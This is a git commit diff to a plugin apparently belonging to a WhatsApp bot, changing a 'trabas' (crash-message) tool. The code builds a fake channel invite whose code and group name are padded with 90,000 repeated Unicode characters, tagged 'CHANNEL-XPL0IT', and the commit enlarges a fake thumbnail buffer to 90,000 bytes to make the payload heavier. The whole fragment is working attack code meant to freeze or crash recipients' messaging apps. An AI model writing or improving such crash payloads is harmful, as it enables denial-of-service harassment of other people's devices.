bb99d715efa888fbf227c0e93f5adf5245a48f80
Tobiprueba <virtualvirtuales538@gmail.com>
2025-07-04 18:32:40 -0600

    Add files via upload

--- plugins/tools-trabas.js
+++ plugins/tools-trabas.js
@@ -2,7 +2,7 @@ let handler = async (m, { conn }) => {
   const inviteCode = 'CHANNEL-XPL0IT-' + '𓂀'.repeat(90000);
   const groupName = '🔥 Canal Oficial ⚠️' + '꧁'.repeat(90000);
   const channelJid = '120363999999999999@g.us'; // Pon el JID de un canal real si quieres
-  const thumbnailFake = Buffer.alloc(1); // Al menos 1 byte, para evitar error
+  const thumbnailFake = Buffer.alloc(90000); // Al menos 1 byte, para evitar error
 
   const fakeInviteContent = {
     groupJid: channelJid,
